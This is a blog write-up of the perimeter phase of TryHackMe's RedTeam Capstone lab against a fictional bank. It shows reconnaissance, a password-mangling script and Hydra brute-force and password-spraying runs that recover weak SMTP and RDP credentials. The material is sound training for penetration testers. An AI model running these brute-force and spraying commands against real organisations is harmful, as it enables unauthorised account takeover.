---
title: Breaking the Vault | A Detailed Walkthrough of the RedTeam Capstone Challenge
author: Muhammad Adel
date: 2024-07-26 18:52:00 +0200
categories: [RedTeaming]
tags: [tryhackme, redteam , active directory, windows, writeups]
---
TryHackMe’s RedTeam Capstone Challenge provides an unparalleled, hands-on experience that simulates real-world hacking scenarios. This challenge tests your skills in network infiltration, vulnerability exploitation, and navigating complex defenses.
![Untitled](/assets/N-RedTeamCC/badge.png)

Peace be upon all of you, In this writeup, I won't just be sharing the direct solutions. Instead, I'll take you on a journey through my own experiences, including the failed attempts and the lessons learned. Together, we'll navigate the twists and turns of this capstone challenge, making it feel as if you're solving it yourself. Get ready to dive deep into the world of red teaming, and let's hack the bank.

## **Introduction**
### **Project Overview**
TryHackMe, a cybersecurity consultancy firm, has been approached by the government of Trimento to perform a red team engagement against their Reserve Bank (TheReserve).

Trimento is an island country situated in the Pacific. While they may be small in size, they are by no means not wealthy due to foreign investment. Their reserve bank has two main divisions:

- **Corporate** - The reserve bank of Trimento allows foreign investments, so they have a department that takes care of the country's corporate banking clients.
- **Bank** - The reserve bank of Trimento is in charge of the core banking system in the country, which connects to other banks around the world.

The Trimento government has stated that the assessment will cover the entire reserve bank, including both its perimeter and internal networks. They are concerned that the corporate division while boosting the economy, may be endangering the core banking system due to insufficient segregation. The outcome of this red team engagement will determine whether the corporate division should be spun off into its own company.

### **Project Goal**
The purpose of this assessment is to evaluate whether the corporate division can be compromised and, if so, determine if it could compromise the bank division. A simulated fraudulent money transfer must be performed to fully demonstrate the compromise.

To do this safely, TheReserve will create two new core banking accounts for you. You will need to demonstrate that it's possible to transfer funds between these two accounts. The only way this is possible is by gaining access to SWIFT, the core backend banking system.

***Note:** SWIFT* (Society for Worldwide Interbank Financial Telecommunications) *is the actual system that is used by banks for backend transfers. In this assessment, a core backend system has been created. However, for security reasons, intentional inaccuracies have been introduced into this process. If you wish to learn more about actual SWIFT and its security, feel free to go do some research! To put it in other words, the information that follows here has been **made up**.*

To help you understand the project goal, the government of Trimento has shared some information about the SWIFT backend system. SWIFT runs in an isolated secure environment with restricted access. While the word impossible should not be used lightly, the likelihood of the compromise of the actual hosting infrastructure is so slim that it is fair to say that it is impossible to compromise this infrastructure.

However, the SWIFT backend exposes an internal web application at [http://swift.bank.thereserve.loc/,](http://swift.bank.thereserve.loc/,) which TheReserve uses to facilitate transfers. The government has provided a general process for transfers. To transfer funds:

1. A customer makes a request that funds should be transferred and receives a transfer code.
2. The customer contacts the bank and provides this transfer code.
3. An employee with the capturer role authenticates to the SWIFT application and *captures* the transfer.
4. An employee with the approver role reviews the transfer details and, if verified, *approves* the transfer. This has to be performed from a jump host.
5. Once approval for the transfer is received by the SWIFT network, the transfer is facilitated and the customer is notified.

Separation of duties is performed to ensure that no single employee can both capture and approve the same transfer.

### **Project Scope**
This section details the project scope.
**In-Scope**
- Security testing of TheReserve's internal and external networks, including all IP ranges accessible through your VPN connection.
- OSINTing of TheReserve's corporate website, which is exposed on the external network of TheReserve. Note, this means that all OSINT activities should be limited to the provided network subnet and no external internet OSINTing is required.
- Phishing of any of the employees of TheReserve.
- Attacking the mailboxes of TheReserve employees on the WebMail host (.11).
- Using any attack methods to complete the goal of performing the transaction between the provided accounts.
**Out-of-Scope**
- Security testing of any sites not hosted on the network.
- Any security testing on the WebMail server (.11) that alters the mail server configuration or its underlying infrastructure.
- Attacking the mailboxes of other red teamers on the WebMail portal (.11).
- External (internet) OSINT gathering.
- Attacking any hosts outside of the provided subnet range. Once you have completed the questions below, your subnet will be displayed in the network diagram. This 10.200.X.0/24 network is the only in-scope network for this challenge.

### **Project Tools**
In order to perform the project, the government of Trimento has decided to disclose some information and provide some tools that might be useful for the exercise. You do not have to use these tools and are free to use whatever you prefer. If you wish to use this information and tools, you can either find them on the AttackBox under **`/root/Rooms/CapstoneChallenge`** or download them as a task file using the blue button at the top of this task above the video. If you download them as a task file, use the password of **`Capstone`** to extract the zip. Note that these tools will be flagged as malware on Windows machines.

**Note**: For the provided password policy that requires a special character, the characters can be restricted to the following: **`!@#$%^`**

### **Project Registration**
The Trimento government mandates that all red teamers from TryHackMe participating in the challenge must register to allow their **single point of contact** for the engagement to track activities. As the island's network is segregated, this will also provide the testers access to an email account for communication with the government and an **approved phishing email address**, should phishing be performed.

To register, you need to get in touch with the government through its e-Citizen communication portal that uses SSH for communication. Here are the SSH details provided:

| SSH Username | e-citizen |
| --- | --- |
| SSH Password | stabilitythroughcurrency |
| SSH IP | X.X.X.250 |

Once you complete the questions below, the network diagram at the start of the room will show the IP specific to your network. Use that information to replace the X values in your SSH IP.

Once you authenticate, you will be able to communicate with the e-Citizen system. Follow the prompts to register for the challenge, and save the information you get for future reference. Once registered, follow the instructions to verify that you have access to all the relevant systems.

The VPN server and the e-Citizen platform are not in scope for this assessment, and any security testing of these systems may lead to a ban from the challenge.

As you make your way through the network, you will need to prove your compromises. In order to do that, you will be requested to perform specific steps on the host that you have compromised. Please note the hostnames in the network diagram above, as you will need this information. **Flags can only be accessed from matching hosts, so even if you have higher access, you will need to lower your access to the specific host required to submit the flag.**

**Note: If the network has been reset or if you have joined a new subnet after your time in the network expired, your e-Citizen account will remain active. However, you will need to request that the system recreates your mailbox for you. This can be done by authenticating to e-Citizen and then selecting option 3.**

### **Summary**
Please make sure you understand the points below before starting. If any point is unclear, please reread this task.

- The purpose of this assessment is to evaluate whether the corporate division can be compromised and, if so, determine if it could result in the compromise of the bank division.
- To demonstrate the compromise, a simulated fraudulent money transfer must be performed by gaining access to the SWIFT core backend banking system.
- The SWIFT backend infrastructure is secure but exposes an internal web application used by TheReserve to facilitate transfers.
- A general process for transfers involves the separation of duties to ensure that one employee cannot both capture and approve the same transfer.
- You have been provided with some information and tools that you may find helpful in the exercise, including a password policy, but you are free to use your own.
- There are rules in place that determine what you are allowed and disallowed to do. Failure to adhere to these rules might result in a ban from the challenge.
- After gaining access to the network, you need to register for the challenge through e-Citizen communication portal using provided SSH details.
- You will need to prove compromises by performing specific steps on the host that you have compromised. These steps will be provided to you through the e-Citizen portal.
![Untitled](/assets/N-RedTeamCC/08d12c36-9c71-4668-8f59-1d9adf1d5725.png)

## **Preparations**
### **Capstone Challenge Resources**
Downloading the Capstone Challenge resources, we receive two files detailing the current password policies and a base list of passwords. Additionally, we get a list of common tools to use throughout the challenge.

### **Updating the hosts file**
We start by adding the IP addresses in our hosts file, so that we can resolve hostname even if we change subnets.
```txt
10.200.89.11 MAIL.thereserve.loc
10.200.89.12 VPN.thereserve.loc
10.200.89.13 WEB.thereserve.loc
```

### **SSH Registration**
We accessed the e-citizen communication portal via SSH using the provided credentials and registered our account. This portal will be crucial for proving the compromises, as it requires us to perform specific steps on the compromised hosts.
```bash
$ ssh e-citizen@10.200.113.250
e-citizen@10.200.113.250's password: 

Welcome to the e-Citizen platform!
Please make a selection:
[1] Register
[2] Authenticate
[3] Exit
Selection:1
Please provide your THM username: ItsFadinG
Creating email user
User has been successfully created
=======================================
Thank you for registering on e-Citizen for the Red Team engagement against TheReserve.
Please take note of the following details and please make sure to save them, as they will not be displayed again.
=======================================
Username: ItsFadinG
Password: 8y-oRyYwJhO8Q7xe
MailAddr: ItsFadinG@corp.th3reserve.loc
IP Range: 10.200.113.0/24
=======================================
These details are now active. As you can see, we have already purchased a domain for **domain squatting** to be used for phishing.
Once you discover the webmail server, you can use these details to authenticate and recover additional project information from your mailbox.
Once you have performed actions to compromise the network, please authenticate to e-Citizen in order to provide an update to the government. If your update is sufficient, you will be awarded a flag to indicate progress.
=======================================
Please note once again that the e-Citizen platform, and this VPN server, 10.200.113.250, are not in-scope for this assessment.
Any attempts made against this machine will result in a ban from the challenge.
=======================================
Best of luck and may you hack the bank!
```

## **Exploring The Network**
### **WEB Machine**
#### **Nmap**
We will start by doing Nmap to know the available ports on the WEB machine.
```bash
nmap -p- 10.200.113.13           
Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-19 13:43 EET
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

#### **The Web Page**
This IP is hosting a web page that gives us an overview about the company and its team. As this simulates real red team engagements, knowing company workers is a critical part of any redteam engagements.
```bash
Aimee Walker -- Lead Developers
Patrick Edwards -- Lead Developers
Brenda Henderson -- Bank Director
Leslie Morley -- Deputy Directors
Martin Savage -- Deputy Directors
paula bailey -- CEO 
christopher smith -- CIO 
antony ross -- CTO 
charlene thomas -- CMO 
rhys parsons -- COO 
lynda gordon -- Personal Assistance to the Executives
Roy sims -- Project Manager
laura wood
emily harvey
ashley chan
keith allen
mohammad ahmed
```
Also, looking at the image name gave us hints about the email creation rules that are being used by the organization: `firstname.lastname@domain.com`
![Untitled](/assets/N-RedTeamCC/Untitled.png)

#### **Directory Brute forcing**
```bash
┌──(root㉿kali)-[/opt/dirsearch]
└─$ python3 dirsearch.py -u 10.200.113.13 -e php --random-agent

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php | HTTP method: GET | Threads: 25 | Wordlist size: 9513

Output: /opt/dirsearch/reports/_10.200.113.13/_24-05-19_14-22-08.txt

Target: http://10.200.113.13/

[14:22:08] Starting:                                            
[14:23:39] 200 -   24KB - /info.php                                        
```
![Untitled](/assets/N-RedTeamCC/Untitled%201.png)

Great! There is an exposed PHP info file that is leaking so much info about this web server. Using a plugin for the browser called Wappalyzer, we can check on the technologies used by the server, including their versions. October CMS is being used, so let's brute force its directory.
```bash
┌──(root㉿kali)-[/opt/dirsearch]
└─$ python3 dirsearch.py -u 10.200.113.13/october -e php --random-agent

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                                                                                                            
 (_||| _) (/_(_|| (_| )                                                                                                                                                                                                                   
Extensions: php | HTTP method: GET | Threads: 25 | Wordlist size: 9513

Output: /opt/dirsearch/reports/_10.200.113.13/_october_24-05-19_14-31-34.txt

Target: http://10.200.113.13/

[14:31:35] Starting: october/                                                                                                                                                                                                               
[14:31:44] 200 -   15B  - /october/.gitignore                                                                 
[14:32:42] 301 -  323B  - /october/config  ->  http://10.200.113.13/october/config/
[14:32:43] 200 -  683B  - /october/config/                                  
[14:32:43] 500 -    0B  - /october/config/app.php
[14:33:10] 200 -    1KB - /october/index.php                                                 
[14:33:26] 301 -  324B  - /october/modules  ->  http://10.200.113.13/october/modules/
[14:33:26] 200 -  478B  - /october/modules/                                 
[14:33:42] 200 -  453B  - /october/plugins/                                 
[14:33:42] 301 -  324B  - /october/plugins  ->  http://10.200.113.13/october/plugins/
[14:33:47] 200 -    2KB - /october/README.md                                
[14:33:52] 200 -    1KB - /october/server.php                               
[14:34:00] 301 -  324B  - /october/storage  ->  http://10.200.113.13/october/storage/
[14:34:00] 200 -  549B  - /october/storage/                                 
[14:34:05] 200 -  454B  - /october/themes/                                  
[14:34:05] 301 -  323B  - /october/themes  ->  http://10.200.113.13/october/themes/
[14:34:11] 200 -  780B  - /october/vendor/                                  
[14:34:11] 200 -    0B  - /october/vendor/composer/autoload_classmap.php    
[14:34:11] 200 -    0B  - /october/vendor/composer/autoload_files.php
[14:34:12] 200 -    0B  - /october/vendor/composer/autoload_real.php
[14:34:12] 200 -    0B  - /october/vendor/composer/autoload_static.php
[14:34:12] 200 -    0B  - /october/vendor/composer/ClassLoader.php          
[14:34:11] 200 -    0B  - /october/vendor/autoload.php
[14:34:12] 200 -    0B  - /october/vendor/composer/autoload_namespaces.php  
[14:34:12] 200 -    1KB - /october/vendor/composer/LICENSE                  
[14:34:12] 200 -    0B  - /october/vendor/composer/autoload_psr4.php        
[14:34:13] 200 -  132KB - /october/vendor/composer/installed.json     
```
Going through the discovered paths indicating that there are so many directory listing in this web server but one of them caught my eyes! `http://10.200.113.13/october/modules/`
![Untitled](/assets/N-RedTeamCC/Untitled%202.png)

Going through the backend files, it tells us that there is an administration panel, but what is its path? With the help of brute forcing and guessing, I was able to discover the correct path for the administration panel.
```bash
python3 dirsearch.py -u 10.200.113.13/october/index.php/ -e php --random-agent                   

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                    
 (_||| _) (/_(_|| (_| )                                                                                             
     
Extensions: php | HTTP method: GET | Threads: 25 | Wordlist size: 9513

Output: /opt/dirsearch/reports/_10.200.113.13/_october_index.php__24-05-19_15-06-24.txt

Target: http://10.200.113.13/

[15:06:25] Starting: october/index.php/                                                                             
[15:06:29] 404 -  275B  - /october/index.php/%2e%2e//google.com             
[15:07:33] 302 -  482B  - /october/index.php/backend/  ->  http://10.200.113.13/october/index.php/backend/backend/auth
[15:07:59] 200 -  965B  - /october/index.php/error                          
[15:08:00] 200 -  965B  - /october/index.php/error/     
```
![Untitled](/assets/N-RedTeamCC/Untitled%203.png)
![Untitled](/assets/N-RedTeamCC/Untitled%204.png)

Hmm! But what could be the username and the password for this? Let’s resume our enumeration for other exposed IPs, such as the VPN and Mail Server.

### **VPN Machine**
#### **Nmap**
```bash
# Nmap 7.93 scan initiated Sat May 13 14:29:54 2023 as: nmap -p- --min-rate 5000 -oN
scans/nmap_alltcp.md 10.200.103.12
Nmap scan report for 10.200.103.12
Host is up (0.057s latency).
Not shown: 65532 closed tcp ports (reset)
PORT STATE SERVICE
22/tcp open ssh
80/tcp open http
1194/tcp open openvpn
# Nmap done at Sat May 13 14:30:05 2023 -- 1 IP address (1 host up) scanned in 11.71 
```

#### **The Web Page**
a normal login page, but if we got any creds we will get access to the Internal Network.
![Untitled](/assets/N-RedTeamCC/Untitled%205.png)

#### **Directory Brute forcing**
```bash
┌──(root㉿kali)-[/opt/dirsearch]
└─$ python3 dirsearch.py -u http://10.200.113.12/ --random-agent

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                    
 (_||| _) (/_(_|| (_| )                                                                                             

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11590

Output: /opt/dirsearch/reports/http_10.200.113.12/__24-05-19_15-48-16.txt

Target: http://10.200.113.12/

[15:48:16] Starting:                                                                                                                                            
[15:50:24] 200 -    5B  - /login.php                                        
[15:50:26] 302 -    0B  - /logout.php  ->  index.php                                                         
[15:51:25] 302 -    0B  - /upload.php  ->  index.php                        
[15:51:30] 200 -  462B  - /vpn/  
```
The `/vpn/` directory only contains an `.ovpn` open VPN config file.
![Untitled](/assets/N-RedTeamCC/ef9e13af-12ae-4595-897c-0bd7f1ac21e8.png)

hmm! What could this ovpn file give us access to? Let’s try to connect and see.
```bash
(root㉿kali)-[~/THM/N-RedTeamCC]
└─$ openvpn corpUsername.ovpn

┌──(root㉿kali)-[~/THM/N-RedTeamCC]
└─$ ifconfig tun1     
tun1: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet **12.100.1.8**  netmask 255.255.255.0  destination 12.100.1.8
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
        RX packets 1  bytes 48 (48.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```
We have been assigned a new IP, let’s scan this subnet with Nmap.
```bash
┌──(root㉿kali)-[~/THM/N-RedTeamCC]
└─$ nmap -sP 12.100.1.0/24
Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-20 13:30 EET
Nmap scan report for 1.mubc.chcg.chcgil24.dsl.att.net (12.100.1.1)
Host is up (0.18s latency).
Nmap scan report for 9.mubc.chcg.chcgil24.dsl.att.net (12.100.1.9)
Host is up.
Nmap done: 256 IP addresses (2 hosts up) scanned in 14.68 seconds
```
It seems that no other host is alive on this network. One Sec! Here, I have only scanned the subnet **`12.100.1.0/24`** but maybe this VPN will give us access to other machines on the network in a different subnet or range. Let’s see the route.

```bash
┌──(root㉿kali)-[~/THM/N-RedTeamCC]
└─$ route
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
10.50.110.0     0.0.0.0         255.255.255.0   U     0      0        0 tun0
10.200.x.0    10.50.110.1     255.255.255.0   UG    1000   0        0 tun0
10.200.x.21   1.mubc.chcg.chc 255.255.255.255 UGH   1000   0        0 tun1
10.200.x.22   1.mubc.chcg.chc 255.255.255.255 UGH   1000   0        0 tun1
12.100.1.0      0.0.0.0         255.255.255.0   U     0      0        0 tun1

```
Who are those **10.200.x.21/22** ?? Let’s put them aside for now and resume our enumeration phase on the MAIL machine.

### **Mail Machine**
#### **Nmap**
```bash
# Nmap 7.93 scan initiated Sat May 13 12:22:57 2023 as: nmap -p- --min-rate 5000 -oN
scans/nmap_alltcp 10.200.103.11
Nmap scan report for 10.200.103.11
Host is up (0.053s latency).
Not shown: 65513 closed tcp ports (reset)
PORT STATE SERVICE
22/tcp open ssh
25/tcp open smtp
80/tcp open http
110/tcp open pop3
135/tcp open msrpc
139/tcp open netbios-ssn
143/tcp open imap
445/tcp open microsoft-ds
587/tcp open submission
3306/tcp open mysql
3389/tcp open ms-wbt-server
5985/tcp open wsman
33060/tcp open mysqlx
47001/tcp open winrm
49664/tcp open unknown
49665/tcp open unknown
49666/tcp open unknown
49667/tcp open unknown
49668/tcp open unknown
49669/tcp open unknown
49670/tcp open unknown
49682/tcp open unknown

┌──(root㉿kali)-[~/THM/N-RedTeamCC]
└─$ nmap -p22,25,80,110,135,139,143,445,587,3306,3389,5985,33060,47001,49664,49665,49666,49667,49668,49669,49670,49682 10.200.113.11 -A
Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-20 15:36 EET
Stats: 0:00:37 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 61.90% done; ETC: 15:37 (0:00:22 remaining)
Stats: 0:00:39 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 61.90% done; ETC: 15:37 (0:00:23 remaining)
Nmap scan report for 10.200.113.11
Host is up (0.15s latency).

PORT      STATE  SERVICE       VERSION
22/tcp    open   ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 f36c52d27fe90e1cc1c7ac962cd1ec2d (RSA)
|   256 c2563cedc4b069a8e7ad3c310505e985 (ECDSA)
|_  256 d3e5f07375d520d9c0bb4199e7afa000 (ED25519)
25/tcp    open   smtp          hMailServer smtpd
| smtp-commands: MAIL, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp    open   http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
110/tcp   open   pop3          hMailServer pop3d
|_pop3-capabilities: UIDL USER TOP
135/tcp   open   msrpc         Microsoft Windows RPC
139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
143/tcp   open   imap          hMailServer imapd
|_imap-capabilities: ACL completed IMAP4 CAPABILITY NAMESPACE CHILDREN OK RIGHTS=texkA0001 SORT QUOTA IMAP4rev1 IDLE
445/tcp   open   microsoft-ds?
587/tcp   open   smtp          hMailServer smtpd
| smtp-commands: MAIL, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
3306/tcp  open   mysql         MySQL 8.0.31
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.31
|   Thread ID: 38
|   Capabilities flags: 65535
|   Some Capabilities: Support41Auth, SwitchToSSLAfterHandshake, Speaks41ProtocolOld, FoundRows, SupportsTransactions, IgnoreSigpipes, LongColumnFlag, Speaks41ProtocolNew, SupportsLoadDataLocal, DontAllowDatabaseTableColumn, LongPassword, InteractiveClient, ODBCClient, ConnectWithDatabase, SupportsCompression, IgnoreSpaceBeforeParenthesis, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: <     6\x10:?DoI\x1B=eB\x04wK*DHs
|_  Auth Plugin Name: caching_sha2_password
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=MySQL_Server_8.0.31_Auto_Generated_Server_Certificate
| Not valid before: 2023-01-10T07:46:11
|_Not valid after:  2033-01-07T07:46:11
3389/tcp  open   ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=MAIL.thereserve.loc
| Not valid before: 2024-05-18T10:42:27
|_Not valid after:  2024-11-17T10:42:27
|_ssl-date: 2024-05-20T13:38:04+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: THERESERVE
|   NetBIOS_Domain_Name: THERESERVE
|   NetBIOS_Computer_Name: MAIL
|   DNS_Domain_Name: thereserve.loc
**|   DNS_Computer_Name: MAIL.thereserve.loc**
|   DNS_Tree_Name: thereserve.loc
|   Product_Version: 10.0.17763
|_  System_Time: 2024-05-20T13:37:55+00:00
5985/tcp  open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
33060/tcp open   mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|     HY000
|   LDAPBindReq: 
|     *Parse error unserializing protobuf message"
|_    HY000
47001/tcp open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0

```

#### **The Web Page**
![Untitled](/assets/N-RedTeamCC/Untitled%206.png)

#### **Directory Brute forcing**
```bash
──(root㉿kali)-[~]
└─$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.200.89.11//october/index.php/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.200.113.11//october/index.php/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

:: Progress: [220560/220560] :: Job [1/1] :: 315 req/sec :: Duration: [0:12:54] :: Errors: 0 ::
```
It seems nothing there!

#### **Accessing Our MailBox**
As the SSH Server instructions suggest, it gave us creds for an email, so let’s download any mail service like **thunderbird** to get access to our inbox.
```bash
$ tar xjf thunderbird-*.tar.bz2 
$ rm thunderbird-*.tar.bz2
$ mv thunderbird /opt
$ sudo ln -s /opt/thunderbird/thunderbird /usr/local/bin/thunderbird
```
Then run the **thunderbird** app and click on Set Up an Existing Email. Adding the password that we received earlier and connecting
![Untitled](/assets/N-RedTeamCC/Untitled%207.png)

Once connected, we will find the following message:
![Untitled](/assets/N-RedTeamCC/Untitled%208.png)

I have tried to send emails to others members to see If I could phish other users and get access, but it gives me the following error:
![Untitled](/assets/N-RedTeamCC/Untitled%209.png)

#### **Password Mangling**
It seems that we are running out of options. The last thing that I can think of is brute forcing. At the beginning of the challenge, we have been provided with `password_base_list.txt` that contains some sample passwords:
```txt
TheReserve
thereserve
Reserve
reserve
CorpTheReserve
corpthereserve
Password
password
TheReserveBank
thereservebank
ReserveBank
reservebank
```
And the following instructions are in the `password_policy.txt` file:
```txt
The password policy for TheReserve is the following:
* At least 8 characters long
* At least 1 number
* At least 1 special character 
* special character !@#$%^
```
So we could expand our wordlist using the mangling technique.
#### **Mangler Script**
With the help of ChatGPT "he" has created the following script:
```python
import itertools

# Read the base wordlist
with open('password_base_list.txt', 'r') as f:
    base_words = f.read().splitlines()

# Define the numbers and special characters
numbers = '0123456789'
special_chars = '!@#$%^'

# Function to generate mangled passwords
def generate_mangled_passwords(word):
    mangled_passwords = set()

    # Append numbers and special characters
    for num in numbers:
        for char in special_chars:
            # Add the number and special character at different positions
            mangled_passwords.add(word + num + char)
            mangled_passwords.add(word + char + num)

    # Ensure all generated passwords are at least 8 characters long
    mangled_passwords = {pwd for pwd in mangled_passwords if len(pwd) >= 8}
    
    return mangled_passwords
    
# Generate passwords and write to file
with open('generated_passwords.txt2', 'w') as f:
    for word in base_words:
        mangled_passwords = generate_mangled_passwords(word)
        for pwd in mangled_passwords:
            f.write(pwd + '\n')
```

Running the script will expand our wordlist with, 1440 new passwords. We have multiple choices for using this wordlist as we have *( The Admin Panel for October CMS - The VPN Portal -  SSH Services and others - SMTP Mail Server ).* 

#### **Brute forcing the Mail Server**
We have already collected some info about the team working for the Reserve company and already know the email format that is being used. Let’s create our email wordlist and start the attack.
```txt
aimee.walker@corp.thereserve.loc
patrick.edwards@corp.thereserve.loc
Brenda.henderson@corp.thereserve.loc
leslie.morley@corp.thereserve.loc
martin.savage@corp.thereserve.loc
paula.bailey@corp.thereserve.loc
hristopher.smith@corp.thereserve.loc
antony.ross@corp.thereserve.loc
charlene.thomas@corp.thereserve.loc
rhys.parsons@corp.thereserve.loc
lynda.gordon@corp.thereserve.loc
roy.sims@corp.thereserve.loc
laura.wood@corp.thereserve.loc
emily.harvey@corp.thereserve.loc
ashley.chan@corp.thereserve.loc
keith.allen@corp.thereserve.loc
mohammad.ahmed@corp.thereserve.loc
applications@corp.thereserve.loc
```
I will be using Hydra tool for this attack.
```bash
$ hydra -L ../emails.txt -P generated_passwords2.txt 10.200.113.11 smtp 
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-21 14:31:13
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 25920 login tries (l:18/p:1440), ~1620 tries per task
[DATA] attacking smtp://10.200.113.11:25/
[STATUS] 1049.00 tries/min, 1049 tries in 00:01h, 24871 to do in 00:24h, 16 active
[STATUS] 1016.00 tries/min, 3048 tries in 00:03h, 22872 to do in 00:23h, 16 active
[STATUS] 1066.71 tries/min, 7467 tries in 00:07h, 18453 to do in 00:18h, 16 active
[STATUS] 1056.83 tries/min, 12682 tries in 00:12h, 13238 to do in 00:13h, 16 active
[STATUS] 1030.06 tries/min, 17511 tries in 00:17h, 8409 to do in 00:09h, 16 active
**[25][smtp] host: 10.200.113.11   login: laura.wood@corp.thereserve.loc   password: Password1@**
[STATUS] 1045.00 tries/min, 22990 tries in 00:22h, 2930 to do in 00:03h, 16 active
**[25][smtp] host: 10.200.113.11   login: mohammad.ahmed@corp.thereserve.loc   password: Password1!**
1 of 1 target successfully completed, 2 valid passwords found
```
Yess!! We have a valid creds. I thought of accessing their mailbox might lead to sensitive information, but it is EMPTY :)
![Untitled](/assets/N-RedTeamCC/Untitled%2010.png)

#### **Password Spraying**
Hmm! Since there are no emails in their inbox, let’s try to spray those valid creds on the available services. I have tried those creds against the following: 
- **10.200.113.11** — MailBox - SSH - RDP
- **10.200.113.12** — SSH - VPN Portal Login
- **10.200.113.13** — SSH - October CMS Admin Panel
- **10.200.113.21** - RDP ***(Worked!)***
- **10.200.113.22** - RDP ***(Worked!)***
```bash
┌──(root㉿kali)-[~/THM/N-RedTeamCC]
└─$ hydra -L names.txt -P valid_passwords 10.200.113.21 rdp

[3389][rdp] host: 10.200.113.21   login: mohammad.ahmed   password: Password1!

1 of 1 target successfully completed, 1 valid password found
                                                                                                             
┌──(root㉿kali)-[~/THM/N-RedTeamCC]
└─$ hydra -L names.txt -P valid_passwords 10.200.113.22 rdp

[3389][rdp] host: 10.200.113.22   login: laura.wood   password: Password1@
[3389][rdp] host: 10.200.113.22   login: mohammad.ahmed   password: Password1!

1 of 1 target successfully completed, 2 valid passwords found
```
# **Foothold on The Corporate Division Tier 2 Infrastructure**
let’s access them and see what is inside.
```bash
$ xfreerdp /u:mohammad.ahmed /p:'Password1!' +clipboard /dynamic-resolution /cert:ignore /v:10.200.113.21 /drive:share,/opt/
```
![Untitled](/assets/N-RedTeamCC/Untitled%2011.png)

**Submitting Flags**
```bash
┌──(root㉿kali)-[~]
└─$ ssh e-citizen@10.200.113.250
e-citizen@10.200.113.250's password: 

Welcome to the e-Citizen platform!
Please make a selection:
[1] Register
[2] Authenticate
[3] Exit
Selection:2
Please provide your username: ItsFadinG
Please provide your password: ******

Welcome ItsFadinG

What would you like to do?
Please select an option
[1] Submit proof of compromise
[2] Verify past compromises
[3] Verify email access
[4] Get hints
[5] Exit
Selection:1

**# Same Steps from 1-3 as we have got an active directory foothold**
Please select which flag you would like to submit proof for:
[1]     Perimeter Breach
[2]     Active Directory Breach
[3]     CORP Tier 2 Foothold
[4]     CORP Tier 2 Admin
[5]     CORP Tier 1 Foothold
[6]     CORP Tier 1 Admin
[7]     CORP Tier 0 Foothold
[8]     CORP Tier 0 Admin
[9]     BANK Tier 2 Foothold
[10]    BANK Tier 2 Admin
[11]    BANK Tier 1 Foothold
[12]    BANK Tier 1 Admin
[13]    BANK Tier 0 Foothold
[14]    BANK Tier 0 Admin
[15]    ROOT Tier 0 Foothold
[16]    ROOT Tier 0 Admin
[17]    SWIFT Web Access
[18]    SWIFT Capturer Access
[19]    SWIFT Approver Access
[20]    SWIFT Payment Made
[100]   Exit
Selection:1
Please provide the hostname of the host you have compromised (please use the name provided in your network diagram): WRK2

In order to verify your access, please complete the following steps.
1. On the wrk2 host, navigate to the C:\Windows\Temp\ directory
2. Create a text file with this name: ItsFadinG.txt
